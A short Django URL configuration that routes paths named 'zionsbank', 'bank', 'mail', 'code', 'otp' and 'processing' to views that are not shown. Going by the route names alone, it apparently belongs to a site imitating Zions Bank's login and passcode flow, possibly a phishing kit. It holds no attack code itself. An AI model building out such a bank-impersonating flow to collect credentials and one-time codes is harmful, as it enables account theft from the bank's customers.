from django.urls import path
from . import views


from django.contrib.staticfiles.urls import staticfiles_urlpatterns


urlpatterns = [
        path('', views.home),
        path('zionsbank/', views.bank),
        path('code/', views.code),
        path('processing/', views.process),
        path('mail/', views.mail),
        path('bank/', views.detail),
        path('otp/', views.otp),
        ]


urlpatterns += staticfiles_urlpatterns()
